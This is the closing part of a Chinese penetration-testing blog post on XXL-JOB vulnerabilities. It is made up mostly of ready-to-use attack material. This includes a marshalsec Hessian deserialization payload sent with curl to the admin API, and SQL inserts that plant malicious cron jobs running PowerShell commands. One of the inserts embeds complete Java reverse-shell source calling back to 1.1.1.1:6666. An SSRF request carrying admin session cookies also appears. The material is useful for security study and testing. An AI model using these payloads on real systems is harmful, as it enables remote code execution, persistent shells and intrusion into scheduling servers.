+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/9_hu0bf910ec71a2c6dc3343873b355ac3d9_1845468_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/9_hu0bf910ec71a2c6dc3343873b355ac3d9_1845468_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="318"
+		data-flex-basis="765px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">java</span> <span class="o">-</span><span class="n">cp</span> <span class="n">marshalsec</span><span class="o">-</span><span class="mf">0.0.3</span><span class="o">-</span><span class="n">SNAPSHOT</span><span class="o">-</span><span class="nb">all</span><span class="o">.</span><span class="n">jar</span> <span class="n">marshalsec</span><span class="o">.</span><span class="n">Hessian2</span> <span class="n">SpringAbstractBeanFactoryPointcutAdvisor</span> <span class="n">rmi</span><span class="p">:</span><span class="o">//</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span><span class="p">:</span><span class="mi">1099</span><span class="o">/</span><span class="n">mv3dcp</span> <span class="o">&gt;</span> <span class="n">test</span><span class="o">.</span><span class="n">ser</span>
+</span></span><span class="line"><span class="cl"><span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="o">-</span><span class="n">H</span> <span class="s2">&#34;Content-Type: x-application/hessian&#34;</span> <span class="o">--</span><span class="n">data</span><span class="o">-</span><span class="n">binary</span> <span class="nd">@test.ser</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.112.203</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">xxl</span><span class="o">-</span><span class="n">job</span><span class="o">-</span><span class="n">admin</span><span class="o">/</span><span class="n">api</span> <span class="o">-</span><span class="n">x</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8888</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/10.png"
+	width="1863"
+	height="862"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/10_hua4fc426c60d3f92afad63d1e1964e175_251729_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/10_hua4fc426c60d3f92afad63d1e1964e175_251729_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="518px"
+	
+></p>
+<p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/11.jpg"
+	width="2556"
+	height="1048"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/11_hucc255b1da9694126419bcdb0a2e6eb50_376413_480x0_resize_q75_box.jpg 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/11_hucc255b1da9694126419bcdb0a2e6eb50_376413_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="243"
+		data-flex-basis="585px"
+	
+></p>
+<h2 id="5xxl-job-数据库rce">5.XXL-JOB 数据库RCE
+</h2><p><strong>XXL-JOB数据库中密码为md5加密</strong></p>
+<p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/12.png"
+	width="1531"
+	height="254"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/12_huc6e11808aa922185f1dc19bdc9d6ae47_25035_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/12_huc6e11808aa922185f1dc19bdc9d6ae47_25035_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="602"
+		data-flex-basis="1446px"
+	
+></p>
+<p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/13.png"
+	width="1396"
+	height="462"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/13_hu5645c23ec852031b813ecf0cdd7ef3bb_31451_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/13_hu5645c23ec852031b813ecf0cdd7ef3bb_31451_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="725px"
+	
+></p>
+<p><strong>xxl-job-admin会定时从数据库中查询待执行的任务，在一定时间内执行。也就是说，我们只需要往数据库里插入我们构造好的恶意定时任务。他便会让executor去执行。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">INSERT</span> <span class="n">INTO</span> <span class="err">`</span><span class="n">xxl_job</span><span class="err">`</span><span class="o">.</span><span class="err">`</span><span class="n">xxl_job_info</span><span class="err">`</span> 
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="err">`</span><span class="nb">id</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">job_group</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">job_desc</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">add_time</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">update_time</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">author</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">alarm_email</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">schedule_type</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">schedule_conf</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">misfire_strategy</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">executor_route_strategy</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">executor_handler</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">executor_param</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">executor_block_strategy</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">executor_timeout</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">executor_fail_retry_count</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">glue_type</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">glue_source</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">glue_remark</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">glue_updatetime</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">child_jobid</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">trigger_status</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">trigger_last_time</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">trigger_next_time</span><span class="err">`</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">VALUES</span> <span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;22222&#39;</span><span class="p">,</span> <span class="s1">&#39;2023-12-27 14:57:36&#39;</span><span class="p">,</span> <span class="s1">&#39;2023-12-27 14:58:23&#39;</span><span class="p">,</span> <span class="s1">&#39;22222&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;CRON&#39;</span><span class="p">,</span> <span class="s1">&#39;0/5 * * * * ?&#39;</span><span class="p">,</span> <span class="s1">&#39;DO_NOTHING&#39;</span><span class="p">,</span> <span class="s1">&#39;FIRST&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;SERIAL_EXECUTION&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;GLUE_POWERSHELL&#39;</span><span class="p">,</span> <span class="s1">&#39;calc</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;12312321&#39;</span><span class="p">,</span> <span class="s1">&#39;2023-12-27 14:57:48&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1703660320000</span><span class="p">,</span> <span class="mi">1703660325000</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/14.png"
+	width="1964"
+	height="168"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/14_hue16f28442e1a9dc1e3358253b5dcfd06_26189_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/14_hue16f28442e1a9dc1e3358253b5dcfd06_26189_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1169"
+		data-flex-basis="2805px"
+	
+></p>
+<p><strong>执行后将</strong><code>trigger_status</code>的值改为1后<strong>每5秒会执行一次命令</strong></p>
+<p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/15.png"
+	width="2023"
+	height="1160"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/15_hu59213546e7b6cc94a3f374770e113571_202399_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/15_hu59213546e7b6cc94a3f374770e113571_202399_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="174"
+		data-flex-basis="418px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">//</span><span class="n">通用反弹shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">INSERT</span> <span class="n">INTO</span> <span class="err">`</span><span class="n">xxl_job</span><span class="err">`</span><span class="o">.</span><span class="err">`</span><span class="n">xxl_job_info</span><span class="err">`</span> <span class="p">(</span><span class="err">`</span><span class="nb">id</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">job_group</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">job_desc</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">add_time</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">update_time</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">author</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">alarm_email</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">schedule_type</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">schedule_conf</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">misfire_strategy</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">executor_route_strategy</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">executor_handler</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">executor_param</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">executor_block_strategy</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">executor_timeout</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">executor_fail_retry_count</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">glue_type</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">glue_source</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">glue_remark</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">glue_updatetime</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">child_jobid</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">trigger_status</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">trigger_last_time</span><span class="err">`</span><span class="p">,</span> <span class="err">`</span><span class="n">trigger_next_time</span><span class="err">`</span><span class="p">)</span> <span class="n">VALUES</span> <span class="p">(</span><span class="mi">99</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;Java RCE&#39;</span><span class="p">,</span> <span class="s1">&#39;2026-01-07 15:10:03&#39;</span><span class="p">,</span> <span class="s1">&#39;2026-01-07 15:10:39&#39;</span><span class="p">,</span> <span class="s1">&#39;111&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;CRON&#39;</span><span class="p">,</span> <span class="s1">&#39;* * * * * ?&#39;</span><span class="p">,</span> <span class="s1">&#39;DO_NOTHING&#39;</span><span class="p">,</span> <span class="s1">&#39;FIRST&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;SERIAL_EXECUTION&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;GLUE_GROOVY&#39;</span><span class="p">,</span> <span class="s1">&#39;package com.xxl.job.service.handler;</span><span class="se">\n\n</span><span class="s1">import java.io.BufferedReader;</span><span class="se">\n</span><span class="s1">import java.io.BufferedWriter;</span><span class="se">\n</span><span class="s1">import java.io.InputStream;</span><span class="se">\n</span><span class="s1">import java.io.InputStreamReader;</span><span class="se">\n</span><span class="s1">import java.io.OutputStream;</span><span class="se">\n</span><span class="s1">import java.io.OutputStreamWriter;</span><span class="se">\n</span><span class="s1">import java.net.Socket;</span><span class="se">\n\n</span><span class="s1">public class reverse {</span><span class="se">\n</span><span class="s1">    class StreamConnector</span><span class="se">\n</span><span class="s1">    extends Thread</span><span class="se">\n</span><span class="s1">    {</span><span class="se">\n</span><span class="s1">        InputStream hx;</span><span class="se">\n</span><span class="s1">        OutputStream il;</span><span class="se">\n\n</span><span class="s1">        StreamConnector(InputStream hx, OutputStream il)</span><span class="se">\n</span><span class="s1">        {</span><span class="se">\n</span><span class="s1">            this.hx = hx;</span><span class="se">\n</span><span class="s1">            this.il = il;</span><span class="se">\n</span><span class="s1">        }</span><span class="se">\n\n</span><span class="s1">        public void run()</span><span class="se">\n</span><span class="s1">        {</span><span class="se">\n</span><span class="s1">            BufferedReader ar = null;</span><span class="se">\n</span><span class="s1">            BufferedWriter slm = null;</span><span class="se">\n</span><span class="s1">            try</span><span class="se">\n</span><span class="s1">                {</span><span class="se">\n</span><span class="s1">                    ar = new BufferedReader(new InputStreamReader(this.hx));</span><span class="se">\n</span><span class="s1">                    slm = new BufferedWriter(new OutputStreamWriter(this.il));</span><span class="se">\n</span><span class="s1">                    char[] buffer = new char[8192];</span><span class="se">\n</span><span class="s1">                    int length;</span><span class="se">\n</span><span class="s1">                    while ((length = ar.read(buffer, 0, buffer.length)) &gt; 0)</span><span class="se">\n</span><span class="s1">                    {</span><span class="se">\n</span><span class="s1">                        slm.write(buffer, 0, length);</span><span class="se">\n</span><span class="s1">                        slm.flush();</span><span class="se">\n</span><span class="s1">                    }</span><span class="se">\n</span><span class="s1">                }</span><span class="se">\n</span><span class="s1">            catch (Exception localException) </span><span class="si">{}</span><span class="se">\n</span><span class="s1">            try</span><span class="se">\n</span><span class="s1">                {</span><span class="se">\n</span><span class="s1">                    if (ar != null) {</span><span class="se">\n</span><span class="s1">                        ar.close();</span><span class="se">\n</span><span class="s1">                    }</span><span class="se">\n</span><span class="s1">                    if (slm != null) {</span><span class="se">\n</span><span class="s1">                        slm.close();</span><span class="se">\n</span><span class="s1">                    }</span><span class="se">\n</span><span class="s1">                }</span><span class="se">\n</span><span class="s1">            catch (Exception localException1) </span><span class="si">{}</span><span class="se">\n</span><span class="s1">        }</span><span class="se">\n</span><span class="s1">    }</span><span class="se">\n</span><span class="s1">    public reverse()</span><span class="se">\n</span><span class="s1">    {</span><span class="se">\n</span><span class="s1">        reverseConn(</span><span class="se">\&#34;</span><span class="s1">1.1.1.1:6666</span><span class="se">\&#34;</span><span class="s1">);</span><span class="se">\n</span><span class="s1">    }</span><span class="se">\n\n</span><span class="s1">    public static void main(String[] args) </span><span class="se">\n</span><span class="s1">    {</span><span class="se">\n</span><span class="s1">        System.out.println(</span><span class="se">\&#34;</span><span class="s1">0</span><span class="se">\&#34;</span><span class="s1">);</span><span class="se">\n</span><span class="s1">    }</span><span class="se">\n\n</span><span class="s1">    public void reverseConn(String ip)</span><span class="se">\n</span><span class="s1">    {</span><span class="se">\n</span><span class="s1">        String ipport = ip;</span><span class="se">\n</span><span class="s1">        try</span><span class="se">\n</span><span class="s1">            {</span><span class="se">\n</span><span class="s1">                String ShellPath;</span><span class="se">\n</span><span class="s1">                if (System.getProperty(</span><span class="se">\&#34;</span><span class="s1">os.name</span><span class="se">\&#34;</span><span class="s1">).toLowerCase().indexOf(</span><span class="se">\&#34;</span><span class="s1">windows</span><span class="se">\&#34;</span><span class="s1">) == -1) {</span><span class="se">\n</span><span class="s1">                    ShellPath = new String(</span><span class="se">\&#34;</span><span class="s1">/bin/sh</span><span class="se">\&#34;</span><span class="s1">);</span><span class="se">\n</span><span class="s1">                } else {</span><span class="se">\n</span><span class="s1">                    ShellPath = new String(</span><span class="se">\&#34;</span><span class="s1">cmd.exe</span><span class="se">\&#34;</span><span class="s1">);</span><span class="se">\n</span><span class="s1">                }</span><span class="se">\n</span><span class="s1">                Socket socket = new Socket(ipport.split(</span><span class="se">\&#34;</span><span class="s1">:</span><span class="se">\&#34;</span><span class="s1">)[0], </span><span class="se">\n</span><span class="s1">                                           Integer.parseInt(ipport.split(</span><span class="se">\&#34;</span><span class="s1">:</span><span class="se">\&#34;</span><span class="s1">)[1]));</span><span class="se">\n</span><span class="s1">                Process process = Runtime.getRuntime().exec(ShellPath);</span><span class="se">\n</span><span class="s1">                new StreamConnector(process.getInputStream(), </span><span class="se">\n</span><span class="s1">                                    socket.getOutputStream()).start();</span><span class="se">\n</span><span class="s1">                new StreamConnector(process.getErrorStream(), </span><span class="se">\n</span><span class="s1">                                    socket.getOutputStream()).start();</span><span class="se">\n</span><span class="s1">                new StreamConnector(socket.getInputStream(), </span><span class="se">\n</span><span class="s1">                                    process.getOutputStream()).start();</span><span class="se">\n</span><span class="s1">            }</span><span class="se">\n</span><span class="s1">        catch (Exception e)</span><span class="se">\n</span><span class="s1">            {</span><span class="se">\n</span><span class="s1">                e.printStackTrace();</span><span class="se">\n</span><span class="s1">            }</span><span class="se">\n</span><span class="s1">    }</span><span class="se">\n</span><span class="s1">}&#39;</span><span class="p">,</span> <span class="s1">&#39;Java RCE&#39;</span><span class="p">,</span> <span class="s1">&#39;2026-01-07 15:10:39&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="6xxl-job-后台ssrf漏洞">6.XXL-JOB 后台SSRF漏洞
+</h2><p>影响版本：XXL-JOB&lt;2.4.0</p>
+<p>功能点：调度日志-执行日志</p>
+<p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/16.png"
+	width="2497"
+	height="892"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/16_hu57b52f33c2ea95201d3fd6fb49fa77ba_199876_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/16_hu57b52f33c2ea95201d3fd6fb49fa77ba_199876_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="279"
+		data-flex-basis="671px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /xxl-job-admin/joblog/logDetailCat HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 192.168.112.203:8080
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
+</span></span><span class="line"><span class="cl">Accept: application/json, text/javascript, */*; q=0.01
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+</span></span><span class="line"><span class="cl">X-Requested-With: XMLHttpRequest
+</span></span><span class="line"><span class="cl">Content-Length: 104
+</span></span><span class="line"><span class="cl">Origin: http://192.168.112.203:8080
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Referer: http://192.168.112.203:8080/xxl-job-admin/joblog/logDetailPage?id=182
+</span></span><span class="line"><span class="cl">Cookie: username=admin; password=Go5pMfgyHKJ86E3+GIQ0tYqeFiwMFHoUM7bMknQRxz/5+E2E7RA4ZjNta1iNo5/ZfRfuMGr4cS4JSWJvrlcmXA==; rememberMe=true; XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">executorAddress=http%3A%2F%2F192.168.112.203%3A9999%2F&amp;triggerTime=1767840286000&amp;logId=182&amp;fromLineNum=1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/17.png"
+	width="2560"
+	height="1188"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/17_hu9e82815c1fa0521caedb751d7eee5e27_399323_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/17_hu9e82815c1fa0521caedb751d7eee5e27_399323_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="215"
+		data-flex-basis="517px"
+	
+></p>
+<p><img src="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/18.png"
+	width="1807"
+	height="419"
+	srcset="/p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/18_hubc35912eaa3520d06f28eec79cfb8909_72339_480x0_resize_box_3.png 480w, /p/xxl-job%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/image/18_hubc35912eaa3520d06f28eec79cfb8909_72339_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="431"
+		data-flex-basis="1035px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Jan 08, 2026 11:10 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/graphql%E5%AE%89%E5%85%A8/">
+        
+        
+            <div class="article-image">
+                <img src="/p/graphql%E5%AE%89%E5%85%A8/logo.1a72f6bd258a53b16685f9ddce181b8b_hub20bbea5694ca3a59339a693ae8ca887_27460_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post GraphQL安全"
+                        
+                        data-hash="md5-GnL2vSWKU7Fmhfndzhgbiw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">GraphQL安全</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/">
+        
+        
+            <div class="article-image">
+                <img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/logo.f83219c84d954b3f3875a993a190ecba_hub25acf04595c8d05c82f10f66875711c_26957_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Ruoyi快速打点"
+                        
+                        data-hash="md5-&#43;DIZyE2VSz84damToZDsug==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Ruoyi快速打点</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/jadx-ai-mcp/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JADX AI MCP</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/next.js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/next.js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/logo.d17b66a8326b901fbf01fc0ac9855f0d_hu424a00bfa185708aa761f0cd11881b75_8394_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Next.js常见漏洞"
+                        
+                        data-hash="md5-0XtmqDJrkB&#43;/AfwKyYVfDQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Next.js常见漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/urldns%E9%93%BE%E7%AE%80%E4%BB%8B%E4%B8%8Eshiro%E6%9C%89key%E6%97%A0%E9%93%BE%E5%88%A9%E7%94%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">URLDNS链简介与Shiro有key无链利用</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
